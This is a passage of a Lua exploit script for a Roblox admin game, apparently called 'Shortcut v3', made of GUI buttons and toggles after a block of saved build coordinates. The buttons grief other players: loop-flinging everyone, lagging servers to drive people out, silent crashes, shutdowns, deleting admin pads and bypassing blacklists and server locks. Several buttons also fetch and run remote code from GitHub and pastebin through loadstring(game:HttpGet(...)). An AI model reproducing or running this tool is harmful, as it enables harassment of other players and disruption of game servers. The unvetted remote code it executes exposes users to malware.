SmoothBlockModel80/-30.0645447, 267.429993, 114.638412, -1, -1.50995803e-07, 3.17865059e-08, -1.50995803e-07, 1, -1.50995803e-07, -3.17864846e-08, -1.50995803e-07, -1
SmoothBlockModel221/-41.4657478, 267.429993, 114.641617, -1, -1.50995803e-07, 4.37113883e-08, -1.50995803e-07, 1, -1.50995803e-07, -4.3711367e-08, -1.50995803e-07, -1
SmoothBlockModel55/-67.465744, 267.429993, 114.641617, 1, 0, -1.19248806e-08, 0, 1, 0, 1.19248806e-08, 0, 1
SmoothBlockModel136/-79.4628067, 267.429993, 114.841263, 1, 0, -1.19248806e-08, 0, 1, 0, 1.19248806e-08, 0, 1
SmoothBlockModel120/-73.4628067, 267.429993, 112.841263, -4.37113883e-08, 0, 1, 0, 1, 0, -1, 0, -4.37113883e-08
SmoothBlockModel92/-74.4628067, 267.429993, 88.8412628, -4.37113883e-08, 0, -1, 0, 1, 0, 1, 0, -4.37113883e-08
SmoothBlockModel193/-74.4628067, 267.429993, 77.8412628, -4.37113883e-08, 0, -1, 0, 1, 0, 1, 0, -4.37113883e-08
SmoothBlockModel42/-63.0638351, 267.429993, 80.8439102, -1, -1.50995803e-07, -1.19248806e-08, -1.50995803e-07, 1, -1.50995803e-07, 1.19249037e-08, -1.50995803e-07, -1
SmoothBlockModel187/-51.0638351, 267.429993, 80.8439102, -1, -1.50995803e-07, -1.19248806e-08, -1.50995803e-07, 1, -1.50995803e-07, 1.19249037e-08, -1.50995803e-07, -1
SmoothBlockModel84/-49.0638351, 267.429993, 76.8439102, -4.37113883e-08, 0, -1, 0, 1, 0, 1, 0, -4.37113883e-08
SmoothBlockModel189/-47.0635529, 267.429993, 80.841217, 1, 0, 4.37113883e-08, 0, 1, 0, -4.37113883e-08, 0, 1
SmoothBlockModel28/-34.0635529, 267.429993, 76.841217, -4.37113883e-08, 0, -1, 0, 1, 0, 1, 0, -4.37113883e-08
SmoothBlockModel200/-40.0635529, 267.429993, 82.841217, -4.37113883e-08, 0, -1, 0, 1, 0, 1, 0, -4.37113883e-08
SmoothBlockModel202/-38.0645447, 267.429993, 108.638412, -4.37113883e-08, 0, 1, 0, 1, 0, -1, 0, -4.37113883e-08
SmoothBlockModel188/-36.465744, 267.429993, 99.6416168, -1, -1.50995803e-07, 1.19248806e-08, -1.50995803e-07, 1, -1.50995803e-07, -1.19248575e-08, -1.50995803e-07, -1
SmoothBlockModel21/-40.4657478, 267.429993, 102.641617, -4.37113883e-08, 0, -1, 0, 1, 0, 1, 0, -4.37113883e-08
SmoothBlockModel230/-40.4657478, 267.429993, 108.641617, -1, -1.50995803e-07, 4.37113883e-08, -1.50995803e-07, 1, -1.50995803e-07, -4.3711367e-08, -1.50995803e-07, -1
SmoothBlockModel230/-40.4657478, 267.429993, 108.641617, -1, -1.50995803e-07, 4.37113883e-08, -1.50995803e-07, 1, -1.50995803e-07, -4.3711367e-08, -1.50995803e-07, -1
SmoothBlockModel74/-56.4628067, 267.429993, 104.841263, -4.37113883e-08, 0, -1, 0, 1, 0, 1, 0, -4.37113883e-08
SmoothBlockModel215/-62.465744, 267.429993, 104.641617, -4.37113883e-08, 0, -1, 0, 1, 0, 1, 0, -4.37113883e-08
SmoothBlockModel6/-69.0639267, 267.429993, 98.8091278, -4.37113883e-08, 0, -1, 0, 1, 0, 1, 0, -4.37113883e-08
SmoothBlockModel225/-68.4628067, 267.429993, 92.8412628, -4.37113883e-08, 0, -1, 0, 1, 0, 1, 0, -4.37113883e-08
SmoothBlockModel222/-68.4628067, 267.429993, 86.8412628, -4.37113883e-08, 0, -1, 0, 1, 0, 1, 0, -4.37113883e-08
SmoothBlockModel19/-68.4628067, 267.429993, 82.8412628, -4.37113883e-08, 0, -1, 0, 1, 0, 1, 0, -4.37113883e-08
SmoothBlockModel62/-53.0638351, 267.429993, 86.8439102, -1, -1.50995803e-07, -1.19248806e-08, -1.50995803e-07, 1, -1.50995803e-07, 1.19249037e-08, -1.50995803e-07, -1
SmoothBlockModel32/-51.0638313, 267.429993, 82.8439102, -4.37113883e-08, 0, -1, 0, 1, 0, 1, 0, -4.37113883e-08
SmoothBlockModel2/-46.0638351, 267.429993, 82.8439102, -4.37113883e-08, 0, -1, 0, 1, 0, 1, 0, -4.37113883e-08
SmoothBlockModel200/-40.0635529, 267.429993, 82.841217, -4.37113883e-08, 0, -1, 0, 1, 0, 1, 0, -4.37113883e-08
SmoothBlockModel186/-62.0635529, 268, 93.6412201, 1.94707184e-07, 1, 4.37113883e-08, 4.37113812e-08, -4.37113954e-08, 1, 1, -1.94707184e-07, -4.37113883e-08
SmoothBlockModel48/-47.0639267, 268, 102.809128, -4.37113883e-08, 1, -4.37113883e-08, 4.37113918e-08, -4.37113847e-08, -1, -1, -4.37113918e-08, -4.37113883e-08
SmoothBlockModel93/-54.0635529, 268, 104.64122, -4.37113883e-08, 1, -4.37113883e-08, 4.37113918e-08, -4.37113847e-08, -1, -1, -4.37113918e-08, -4.37113883e-08
SmoothBlockModel224/-67.0635529, 268, 93.841217, 1, 0, 0, 0, -4.37113883e-08, 1, 0, -1, -4.37113883e-08
SmoothBlockModel118/-58.4628067, 268, 96.8412628, -4.37113883e-08, 1, 0, 4.37113883e-08, 1.91068547e-15, 1, 1, 4.37113883e-08, -4.37113883e-08
SmoothBlockModel191/-56.4627991, 266, 103.841263, -4.37113883e-08, 0, 1, 1, -4.37113883e-08, 4.37113883e-08, 4.37113883e-08, 1, 1.91068547e-15
SmoothBlockModel16/-66.4656906, 213.830002, 109.638489, -4.37113883e-08, 0, -1, 0, 1, 0, 1, 0, -4.37113883e-08
SmoothBlockModel143/-40.0629654, 267.429993, 114.634888, -4.37113883e-08, 0, 1, 0, 1, 0, -1, 0, -4.37113883e-08
SmoothBlockModel227/-64.2078857, 267.429993, 105.641556, -4.37113883e-08, 0, -1, 0, 1, 0, 1, 0, -4.37113883e-08
SmoothBlockModel97/-82.4618835, 266.196991, 99.4375534, 1, 0, 0, 0, 1, 0, 0, 0, 1]])
end)

local lfb = tab6:Button("FEATURED bad obby (by quiving)", function()
	writefile("savedthings.lua", [[SmoothBlockModel48/-57.0650024, 11.2300005, 58.2430038, 0, 0, 1, 0, 1, 0, -1, 0, 0
SmoothBlockModel40/-182, 0.299999982, 58, 1, 0, 0, 0, 1, 0, 0, 0, 1
SmoothBlockModel102/-135, -19.6999989, 34, -4.37113883e-08, 0, 1, 1, -4.37113883e-08, 4.37113883e-08, 4.37113883e-08, 1, 1.91068547e-15
SmoothBlockModel98/-161.300003, 3.0999999, 51.9000015, -4.37113883e-08, -1, -1.19248806e-08, -4.37113883e-08, 1.19248824e-08, -1, 1, -4.37113883e-08, -4.37113883e-08
Part7/-164.200012, 19.3000011, 54, 1, 0, 0, 0, 1, 0, 0, 0, 1
SmoothBlockModel92/-151.600006, 10.7000008, 54, -4.37113883e-08, -1, 0, 1, -4.37113883e-08, 0, 0, 0, 1
SmoothBlockModel75/-154, -0.700000703, 52, -4.37113883e-08, -1, -1.19248806e-08, -4.37113883e-08, 1.19248824e-08, -1, 1, -4.37113883e-08, -4.37113883e-08
SmoothBlockModel44/-144, 10.7000008, 54, -4.37113883e-08, -1, 0, 1, -4.37113883e-08, 0, 0, 0, 1
SmoothBlockModel47/-137, 10.7000008, 54, -4.37113883e-08, -1, 0, 1, -4.37113883e-08, 0, 0, 0, 1
SmoothBlockModel12/-131, 10.7000008, 54, -4.37113883e-08, -1, 4.37113883e-08, 1, -4.37113883e-08, 0, 1.91068547e-15, 4.37113883e-08, 1
SmoothBlockModel37/-137.000015, 11.5, 56, -4.37113883e-08, 0, 1, 0, 1, 0, -1, 0, -4.37113883e-08
SmoothBlockModel51/-119.600006, -2.00000286, 54, -4.37113883e-08, -1, 0, 1, -4.37113883e-08, 0, 0, 0, 1
Part6/-122.599976, 27.5000019, 54, 1, 0, 0, 0, 1, 0, 0, 0, 1
SmoothBlockModel30/-118.600006, 16.0999985, 42.9999962, -4.37113883e-08, 1, 0, -1, -4.37113883e-08, 0, 0, 0, 1
SmoothBlockModel41/-119, -17.5, 32, -4.37113883e-08, 1, -2.98023224e-08, 4.37113883e-08, 2.98023259e-08, 1, 1, 4.37113883e-08, -4.37113883e-08
SmoothBlockModel127/-124.999992, 38.3000031, 84.1999969, -4.37113883e-08, 0, 1, -1, -4.37113883e-08, -4.37113883e-08, 4.37113883e-08, -1, 1.91068547e-15
SmoothBlockModel104/-124.999992, -23.0999889, 27.6000042, -4.37113883e-08, 0, 1, 1, -4.37113883e-08, 4.37113883e-08, 4.37113883e-08, 1, 1.91068547e-15
SmoothBlockModel200/-134.199982, 24.8999996, 54, -4.37113883e-08, -1, 0, 1, -4.37113883e-08, 0, 0, 0, 1
SmoothBlockModel136/-140.799988, 24.9000034, 54, -4.37113883e-08, -1, 0, 1, -4.37113883e-08, 0, 0, 0, 1
SmoothBlockModel169/-148.399994, 24.8999996, 54, -4.37113883e-08, -1, 0, 1, -4.37113883e-08, 0, 0, 0, 1
SmoothBlockModel17/-128, 44.8999939, 36.900032, -1, -1.50995803e-07, 4.37113883e-08, 4.37113812e-08, 4.37113954e-08, 1, -1.50995803e-07, 1, -4.37113883e-08
SmoothBlockModel18/-127.899994, 41.6999969, 34.0000305, -1, -1.50995803e-07, 3.17865059e-08, -1.50995803e-07, 1, -1.50995803e-07, -3.17864846e-08, -1.50995803e-07, -1
SmoothBlockModel229/-140.399994, 40.1999931, 33.3000298, 7.54979013e-08, 1, 0, 1, -7.54979013e-08, 1.50995803e-07, 1.50995803e-07, -1.13998666e-14, -1
SmoothBlockModel28/-142, 50.1999893, 36.7000313, 1, 0, -1.19248806e-08, 1.19248806e-08, -4.37113883e-08, 1, -5.21253064e-16, -1, -4.37113883e-08
SmoothBlockModel114/-146, 43.7999916, 36.3000298, 1, 0, 0, 0, 1, 0, 0, 0, 1
SmoothBlockModel162/-145.300003, 43.8999939, 41.6000252, -4.37113883e-08, 0, 1, 0, 1, 0, -1, 0, -4.37113883e-08
SmoothBlockModel100/-145.600006, 52.5, 44, -4.37113883e-08, 0, 1, -1, -4.37113883e-08, -4.37113883e-08, 4.37113883e-08, -1, 1.91068547e-15
SmoothBlockModel33/-145.599976, 51.5, 42, -4.37113883e-08, 0, -1, 0, 1, 0, 1, 0, -4.37113883e-08
SmoothBlockModel91/-146.599976, 57.6999969, 42, -4.37113883e-08, 0, -1, 0, 1, 0, 1, 0, -4.37113883e-08
SmoothBlockModel167/-147.891922, 64.8890533, 49.4360886, -0.0136933131, 0.00450151414, -0.999896109, 3.10540199e-05, 0.999989927, 0.00450151134, 0.999906242, 3.06069851e-05, -0.013693314
SmoothBlockModel59/-147.682373, 64.902359, 40.3963966, -0.013695172, 0.00450921431, -0.999896049, -1.70767307e-05, 0.999989867, 0.00450987089, 0.999906182, 7.88271427e-05, -0.013694955
SmoothBlockModel133/-142.832397, 64.8751831, 40.4782639, -0.0136951506, 0.0045092795, -0.999896049, 3.09050083e-05, 0.999989867, 0.0045092795, 0.999906242, 3.0875206e-05, -0.0136951506
SmoothBlockModel230/-142.941818, 64.8666611, 49.5042191, -0.0136933066, 0.00450153043, -0.999896109, 3.10540199e-05, 0.999989867, 0.00450152764, 0.999906242, 3.06069851e-05, -0.0136933085
SmoothBlockModel2/-145.264252, 64.1567993, 71.3922882, -0.0136933038, 3.06057736e-05, -0.999906242, 0.00450141728, 0.999989867, -3.10367177e-05, 0.999896109, -0.00450142007, -0.0136933029
SmoothBlockModel55/-145.320007, 63.4378204, 77.5, -4.37113883e-08, 0, -1, 0.866025448, 0.49999997, -3.78551732e-08, 0.49999997, -0.866025448, -2.18556924e-08
SmoothBlockModel19/-145.209824, 79.338913, 70.4420776, -0.0136933038, 3.06090406e-05, -0.999906242, 0.0045016557, 0.999989867, -3.10367177e-05, 0.999896109, -0.00450165849, -0.0136933029
SmoothBlockModel184/-153.799515, 87.2045288, 70.5136566, 1, 0, 4.37113883e-08, 4.37113883e-08, -4.37113883e-08, -1, 1.91068547e-15, 1, -4.37113883e-08
SmoothBlockModel138/-146.799515, 95.8045273, 50.9136581, -4.37113883e-08, 0, -1, 0, 1, 0, 1, 0, -4.37113883e-08
Divider7/-146.899521, 97.2045288, 47.9136581, -4.37113883e-08, 0, 1, 0, 1, 0, -1, 0, -4.37113883e-08
Right Wall/-164.800003, 75.7069244, 71, -3.78551732e-08, -0.866025388, -0.5, -6.55670789e-08, -0.5, 0.866025388, -1, 6.55670789e-08, -3.78551732e-08
Ceiling Wall/-144.387955, 84.20401, 39.5136642, 0.866025388, 0.5, 0, -0.5, 0.866025388, 0, 0, 0, 1
Divider6/-144.499527, 99.3045197, 35.9136581, -4.37113883e-08, 0, 1, 0, 1, 0, -1, 0, -4.37113883e-08
Divider5/-143.499527, 99.3045273, 31.4136581, -1, -1.50995803e-07, 0, -1.50995803e-07, 1, -1.50995803e-07, 2.27997332e-14, -1.50995803e-07, -1
Divider8/-148.5, 99.3045197, 35.9099998, -4.37113883e-08, 0, 1, 0, 1, 0, -1, 0, -4.37113883e-08
SmoothBlockModel225/-146.399521, 98.6045303, 28.9136581, -4.37113883e-08, 0, -1, 0, 1, 0, 1, 0, -4.37113883e-08
Part4/-93.3159027, 5.84798479, -10.0294437, 0.999978483, -0.00630147289, 0.00181275245, 0.00630147289, 0.999980152, 5.7115667e-06, -0.00181275245, 5.7115667e-06, 0.999998331
Part5/-108.210274, 21.2168159, -1.97315454, 0.997343898, 0.00206720759, -0.0728074759, -0.00207349681, 0.999997854, -1.07959931e-05, 0.0728072971, 0.000161733362, 0.997346044
Part2/-122.778099, 25.8290482, -4.83807182, 0.99999851, 0.00172644004, 0, -0.00172644004, 0.99999851, 0, 0, 0, 1
Part3/-123.750504, 25.6109066, 9.00004196, 0.999985218, 0.00543826679, 0, -0.00543826679, 0.999985218, 0, 0, 0, 1
Part23/-132.18988, 28.0545883, 10.1210661, 1, 0, 0, 0, 1, 0, 0, 0, 1
Part26/-136.017715, 26.2104034, 10.1480541, 0.999985218, 0.00543826679, 0, -0.00543826679, 0.999985218, 0, 0, 0, 1
Part13/-139.401596, 25.5942841, 18.7983437, 0.999978483, -0.00656043878, 0, 0.00656043878, 0.999978483, 0, 0, 0, 1
Part9/-141.100708, 25.5087967, 26.7588654, 1, 0, 0, 0, 1, 0, 0, 0, 1
Part12/-141.420578, 26.5379753, 35.798481, 0.999991059, -0.00422977004, 0, 0.00422977004, 0.999991059, 0, 0, 0, 1
SmoothBlockModel6/-141.289352, 29.4896145, 43.0312309, -5.96046448e-07, 4.65661287e-10, -1, 0.00158701045, 0.999998748, -4.65661287e-10, 0.999998748, -0.00158701045, -5.96046448e-07
SmoothBlockModel80/-134.665726, 30.5395565, 41.3678131, -6.55651093e-06, 1.67638063e-08, -0.99999994, 0.00512724882, 0.999986827, -1.67638063e-08, 0.999986827, -0.00512724882, -6.55651093e-06
SmoothBlockModel107/-130.146606, 32.8390007, 39.5979233, 7.21216202e-06, 0.000244137831, -0.99999994, 0.00512724835, 0.999986827, 0.000244171591, 0.999986827, -0.00512725022, 5.96046448e-06
SmoothBlockModel97/-125.31823, 36.8065338, 58.0739517, 0.999976158, 0.0069057201, 0, -0.0069057201, 0.999976158, 0, 0, 0, 1
SmoothBlockModel66/-123.94883, 38.0267143, 48.0825729, 0, 0, 1, 0, 1, 0, -1, 0, 0
SmoothBlockModel52/-125.427925, 36.2895432, 91.8568726, 0.999987006, -0.00509298313, 0, 0.00509298313, 0.999987006, 0, 0, 0, 1
SmoothBlockModel150/-110.396759, 40.6387291, 118.45549, 0.00145369768, -4.79165465e-06, 0.999998987, 0.00659216195, 0.999978244, -4.79165465e-06, -0.999977291, 0.00659216195, 0.00145369768
Part15/-114.907005, 37.4554482, 120.917679, 0.999990702, 0.00431609061, 0, -0.00431609061, 0.999990702, 0, 0, 0, 1
Part24/-105.343811, 40.6559181, 112.360199, 0.999998629, -0.00164011808, 0, 0.00164011808, 0.999998629, 0, 0, 0, 1
SmoothBlockModel219/-93.7706451, 40.6213303, 107.493286, 1.37090683e-06, 6.10373681e-05, -0.99999994, 0.00225843722, 0.999997437, 6.10401621e-05, 0.999997437, -0.00225843722, 1.1920929e-06
SmoothBlockModel151/-88.7278519, 40.3805733, 107.831291, 5.84125519e-06, 6.10249117e-05, -1, 0.00482205767, 0.999988377, 6.10526185e-05, 0.999988377, -0.00482205767, 5.54323196e-06
SmoothBlockModel38/-41.1789246, 39.0008812, 122.175407, -1, 0, 0, 0, 1, 0, 0, 0, -1]])
end)

local welcome = tab:Label("Welcome to Shortcut v3. \n A partial rewrite from its predecessor")

local line = tab:line() -- Not causing overlap somehow.

local guicmds = tab:Button("Primary Commands list", function()
	if cmdsglobal == true then
		pass()
		return
	end
	pcall(function()
		getgenv().cmdsglobal = true
	end)
	chatt(prefix.."cmds")
	if shared.firsttimecheckpassed == true then
		logn("Please check the rconsole, located on your second tab.")
	end
end)

local guicmds = tab:Button("House", function()
	chatt("/house")
	if shared.firsttimecheckpassed == true then
		if HOUSEglobal == true then
			pass()
			return
		end
		pcall(function()
			getgenv().HOUSEglobal = true
		end)
		logn("Welcome home. This is where all the adventures start :)")
		local ClientSound = Instance.new("Sound")
		ClientSound.SoundId = "http://www.roblox.com/asset/?id=8522792239"
		ClientSound.Volume = 0.5
		ClientSound.Parent = workspace
		ClientSound.PlaybackSpeed = 1
		ClientSound:Play()
	end
end)

local guicmds = tab:Button("Logs", function()
	local ClientSound = Instance.new("Sound")
	ClientSound.SoundId = "http://www.roblox.com/asset/?id=5807619699"
	ClientSound.Volume = 1.5
	ClientSound.Parent = workspace
	ClientSound.PlaybackSpeed = 1
	ClientSound:Play();wait()
	chatt("Logs are annoying at times ngl.");task.wait(.65)
	pcall(function()
		game.Players.LocalPlayer.PlayerGui.ScrollGui.TextButton.Frame.Size =  UDim2.new(3, t, 1000, j)
	end)
	if shared.firsttimecheckpassed == true then
		if glogsglobal == true then
			pass()
			return
		end
		pcall(function()
			getgenv().glogsglobal = true
		end)
		longlogn("Ah, the logs. Sometimes you just need to know what someone is doing, riiighhtt???")
	end
end)

local toggle = tab:Toggle("Perm", false, function(bool)
	if bool == true then
		regen()
		perm = true
		if PERMglobal == true then
			pass()
			return
		end
		pcall(function()
			getgenv().PERMglobal = true
		end)
		logn("If you still don't have admin, please use any of the EMR functions.")
	end
	if bool == false then
		perm = false
		logn("Perm is now off")
	end
end)

local toggle = tab:Toggle("Perm2", false, function(bool)
	if bool == true then
		logn("In case perm one doesn't work.")
		chatt("/perm")
	end
	if bool == false then
		chatt("/noperm");chatt("/nonperm")
		logn("Perm2 is now off")
	end
end)

local lfb = tab:Button("Double Counter (Anti new-alts)", function()
	chatt(prefix.."doublecounter")
end)

--[[local lfb = tab4:Button("Hybrid Protection", function()
    -- New script
end)]]

local lfb = tab4:Button("Server lock (permaslock)", function()
	chatt(prefix.."permaslock")
	logn("TYPE //finishps to void the last spawn")
	rconsoleprint("TYPE //finishps to void the last spawn")
end)

local lfb = tab4:Button("EMR Find Regen", function()
	logn("Also this won't work if you have infinite yield opened up")
	loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
	chatt("fly me");wait(2.5)
	execCmd("fly 1000")
	execCmd("unkeepiy")
	chatt(prefix.."cframelocatereg")
	chatt(prefix.."movedb")
	execCmd("fly 1000")
	execCmd("showguis");wait(5.5)
	chatt(prefix.."up");wait(8.8)
	chatt(prefix.."toregen");wait(11.5)
	chatt(prefix.."loopgrab")
	execCmd("autorj")
	logn("you're currently loopgrabbing")
	logn("If it still couldn't find the regen then rip it's gone");wait(9)
	chatt(prefix.."voidbypass")
	chatt(prefix.."up");wait(3.75)
	--loadstring(game:HttpGet(('https://raw.githubusercontent.com/M4lw4reT3sts/scripts-cheats-2/main/zoomer.lua'),true))();wait(1.65)
	chatt(prefix.."/repott")
	logn("Scanning possible voidcoords")
    --[[loadstring(
        game:HttpGet(("https://raw.githubusercontent.com/M4lw4reT3sts/scripts-cheats-2/main/teststring2"), true)
    )()]]
	logn("Try to use the Noadmin lagger now or use the Void Searcher if you still don't have the pad")
end)

local lfb = tab4:Button("Void Searcher (bad)", function()
	logn("This command is not recommended at all")
	chatt(prefix.."voidbypass")
	local root = plyrs.LocalPlayer.Character.HumanoidRootPart

	for i=0,100 do wait()
		root.CFrame = CFrame.new(Vector3.new(i * 10000, i * 10000, i * 10000))
	end
	for i=0,100 do wait()
		root.CFrame = CFrame.new(Vector3.new(-(i * 10000), -(i * 10000), -(i * 10000)))
	end


	for i=0,100 do wait()
		root.CFrame = CFrame.new(Vector3.new(-(i * 10000), i * 10000, i * 10000))
	end
	for i=0,100 do wait()
		root.CFrame = CFrame.new(Vector3.new(i * 10000, -(i * 10000), -(i * 10000)))
	end
end)

local lfb = tab4:Button("Forcethrough (blacklist bypass)", function()
	local ClientSound = Instance.new("Sound")
	ClientSound.SoundId = "http://www.roblox.com/asset/?id=8522792239"
	ClientSound.Volume = 1.5
	ClientSound.Parent = workspace
	ClientSound.PlaybackSpeed = 1
	ClientSound:Play()
	chatt(prefix.."voidbypass");task.wait(.35)
	chatt(prefix.."emergencymode1")
	print("Such a nice pffff sound amirite")
	if shared.firsttimecheckpassed == true then
		longlogn("You can use this to break from someone's grasp aka a blacklist or a serverlock")
		longlogn("Antipunish has to be enabled in order for this to work")
		long("ALSO REJOIN AND ENABLE ANTIPUNISH IF FORCETHROUGH FAILS")
	end
end)

local lfb = tab4:Button("Testgrab", function()
	chatt(prefix.."testgrab")
	if shared.firsttimecheckpassed == true then
		longlogn("Testgrab is way faster than loopgrab. Enable this and nobody will bypass your blacklist")
	end
end)

--[[
local lfb = tab4:Button("zoomer", function()
    chatt(prefix.."zoomer")
    if shared.firsttimecheckpassed == true then
        longlogn("The FE zoomer could kick exploiters out of the game when in doubt.")
    end
end)]]

local lfb = tab4:Button("Grief mode (no admin)", function()
	chatt(prefix.."griefmode")
	if shared.firsttimecheckpassed == true then
		longlogn("This will loopfling everyone and it bypasses blacklists/slocks")
	end
end)

local lfb = tab4:Button("Recycle Bin", function()
	chatt(prefix.."recyclebin")
end)

local lfb = tab4:Button("NoAdmin Lagger v2.4X (Syn only)", function()
	chatt(prefix.."emergencymode2")
	longlogn("The API that the lagger uses is not made by anyone related to Shortcut. It can be down at times which results in there being no lag")
	longlogn("The lagger can be used to make people leave")
end)

local line = tab4:line() -- Not causing overlap somehow.

local welcome = tab4:Label("Lagger API status: down (patched, web offline) \n") -- Manually kept track of this since September
local welcome = tab4:Label("\n\n\n\n Statuses: \n USE SEARCH MODE \n INSTEAD \n Up (Working) \n down (patched, web offline) \n nil (Error)")

local slider = tab5:Slider("speed", 16, 500, 0, function(v)
	if antiSpeed == true then
		antiSpeed = false
		reantispeed = true
		logn("AntiSpeed has been Disabled")
	end
	game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = v
end)

local slider = tab5:Slider("FOV", 70, 135, 0, function(v)
	game:GetService'Workspace'.Camera.FieldOfView = v
end)

local toggle = tab5:Toggle("AFK (Tabcheck)", false, function(bool)
	if bool == true then
		chatt(prefix.."tabcheck")
	end
	if bool == false then
		chatt(prefix.."untabcheck")
	end
end)

local antikill = tab2:Toggle("God Mode", false, function(bool)
	if bool == true then
		chatt("/nok")
		if shared.firsttimecheckpassed == true then
			longlogn("When God Mode is Enabled you will be protected from things that can kill you.")
		end
		ELFRGD = true
		if ELFRGD == true then
			if KGODglobal == true then
				pass()
				return
			end
			pcall(function()
				getgenv().KGODglobal = true
			end)
			game.Players.LocalPlayer.CharacterAdded:connect(function()
				task.wait(.65)
				chatt("god "..antilog.." me " .. math.random(1, 1000))
			end)
		end
		if bool == false then
			ELFRGD = false
		end
	end
end)

local antipunish = tab2:Toggle("AntiPunish", false, function(bool)
	if bool == true then
		chatt(prefix.."up")
		logn("Enabling this may cause other antis to not work");
		CLEFDV = true
		coroutine.wrap(function()
			while CLEFDV and scriptActive do
				task.wait(.0095)
				if game.Lighting:FindFirstChild(game.Players.LocalPlayer.Name) then
					emrgrab = true
					chatt(
						"h \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \nDude did you seriously try to punish a superior human being? \n \n \n \n \n \n \n \n \n \n \n \n Stop it, get some help"
					)
					chatt("unpunish me")
					chatt(prefix.."spam unpunish me " .. math.random(1, 1000))
					chatt(prefix.."up");task.wait(0.22)
					chatt("unpunish me " .. math.random(1, 1000))
					chatt(
						"unpunish "..antilog.." random " ..
							math.random(1, 1000)
					) ;task.wait(.33)
					chatt("unpunish me " .. math.random(1, 1000))
					chatt(":refresh me " .. math.random(1, 1000))
					chatt("/trap others")
					chatt(prefix.."stop " .. math.random(1, 1000));wait(5)
					chatt(
						":refresh "..antilog.." others " ..
							math.random(1, 1000))
					emrgrab = false

					wait(5)

					logn("You should manually regenerate as you have all the pads if you're in the workspace")

				end
			end
		end)()
	end
	if bool == false then
		CLEFDV = false
	end
end)

local antisped = tab2:Toggle("AntiSpeed", false, function(bool)
	if bool == true then
		antiSpeed = true
		if reantispeed == true then
			logn("AntiSpeed has been Re-Enabled")
			reantispeed = false
		end
	end
	if bool == false then
		antiSpeed = false
	end
end)

local antigrav = tab2:Toggle("AntiSetgrav", false, function(bool)
	if bool == true then
		antiSetgrav = true
	end
	if bool == false then
		antiSetgrav = false
	end
end)

local antinc = tab2:Toggle("AntiNoclip", false, function(bool)
	if bool == true then
		shared.antinoclip = true
		logn("Enable antigearv2 if people are trying to crash you so you can reverse-crash them")
		antinoclip()
	end
	if bool == false then
		shared.antinoclip = false
	end
end)

--[[local antiseiz = tab2:Toggle("AntiSeizure  pack", false, function(bool)
    if bool == true then
        antiSeizure = true
        antiDisco = true
        antiFlash = true
    end
    if bool == false then
        antiSeizure = false
        antiDisco = false
        antiFlash = false
    end
end)]]

local antibliz = tab2:Toggle("AntiBlizzard", false, function(bool)
	if bool == true then
		antiBlizzard = true
	end
	if bool == false then
		antiBlizzard = false
	end
end)
local antilag = tab5:Toggle("NoHighDetailParts (reduces FPS)", false, function(bool)
	if bool == true then
		antiParticles = true
		wait(10)
		antiRageTable = true
		wait(10)
		fpsboost = true
		task.spawn(function()
			pcall(function()
				task.wait(5.5)
				_G.Settings = {
					Players = {
						["Ignore Me"] = false, -- Ignore your Character
						["Ignore Others"] = false -- Ignore other Characters
					},
					Meshes = {
						Destroy = true, -- Destroy Meshes
						LowDetail = true -- Low detail meshes (NOT SURE IT DOES ANYTHING)
					},
					Images = {
						Invisible = true, -- Invisible Images
						LowDetail = true, -- Low detail images (NOT SURE IT DOES ANYTHING)
						Destroy = true, -- Destroy Images
					},
					["No Particles"] = true, -- Disables all ParticleEmitter, Trail, Smoke, Fire and Sparkles
					["No Camera Effects"] = true, -- Disables all PostEffect's (Camera/Lighting Effects)
					["No Explosions"] = true, -- Makes Explosion's invisible
					["No Clothes"] = true, -- Removes Clothing from the game
					["Low Water Graphics"] = true, -- Removes Water Quality
					["No Shadows"] = true, -- Remove Shadows
					["Low Rendering"] = true, -- Lower Rendering
					["Low Quality Parts"] = true -- Lower quality parts
				}
				loadstring(game:HttpGet("https://pastebin.com/raw/fKCcMqZS"))()

				execCmd("boostfps")
				execCmd("clrchar")

			end);end)
	end
	if bool == false then
		antiParticles = false
		antiRageTable = false
		fpsboost = false
	end
end)

local scrm = tab5:Button("Scramble", function()
	chatt(prefix.."scramble")
end)

local scrm = tab5:Button("Force unpunish", function()
	chatt(prefix.."up")
end)

local scrm = tab5:Button("Clicktp", function()
	chatt("/clicktp")
end)

local scrm = tab5:Button("IY", function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
	logn("Did you know the word ''master'' is in the URL of IY. Aughh");wait(11.5)
	execCmd("showguis")
	execCmd("unkeepiy")
end)

local scrm = tab5:Button("Silent Crash (silcrash)", function()
	chatt(prefix.."silcrash")
end)

local scrm = tab5:Button("Shutdown", function()
	chatt(prefix.."shutdown")
end)

local scrm = tab5:Button("Break Camera SS", function()
	chatt(prefix.."breakcam")
	if shared.firsttimecheckpassed == true then
		if BCAMglobal == true then
			pass()
			return
		end
		pcall(function()
			getgenv().BCAMglobal = true
		end)
		longlogn("You've just broken the Server Camera. This cannot be undone.")
	end
end)

local guicmds = tab:Button("FIX NEWMODE BOOT/RCONSOLE", function()
	writefile("kicksound.json", '{"musicid":"m"}');wait(5)
	rejoin()
end)

--[[if shared.firsttimecheckpassed == true then
		if moduleglobal and not _G.module_DEBUG == true then
			pass()
			return
		end
		pcall(function()
			getgenv().moduleglobal = true
		end)
        longlogn("FIRST TIME TUTORIAL")
    end]]


local scrm = tab5:Button("Blackout", function()
	chatt(prefix.."blackout")
end)

local scrm = tab5:Button("Load Pads", function()
	chatt(prefix.."spam /skydive " .. math.random(1, 1000));wait(3.5)
	chatt("/pads");wait(.5)
	chatt(prefix.."stop");wait(4.5)
	chatt("/pads")
	chatt("setgrav me -9e9");wait()
	chatt("/pads")
	chatt("/perm");wait()
	chatt("/pads");wait()
	chatt("/pads");wait(3.5)
	chatt("unchar me")
	if shared.firsttimecheckpassed == true then
		longlogn("If you cannot get a pad because the admin pads are missing, you can use this command to try to load them")
	end
end)

local scrm = tab5:Button("Delete Admin Pads", function()
	chatt(prefix.."voidbypass");wait(.35)
	chatt("/toggle antivoid");wait(.35)
	chatt("/removepadspiss");wait(15)
	chatt("/toggle antivoid")
end)

local scrm = tab5:Button("Hide Regen Pad", function()
	chatt(prefix.."movereg")
	if shared.firsttimecheckpassed == true then
		longlogn("This is NOT delete")
	end
end)

local scrm = tab5:Button("Fix Baseplate", function()
	chatt(prefix.."fixbp")
	if shared.firsttimecheckpassed == true then
		if fixbpglobal == true then
			pass()
			return
		end
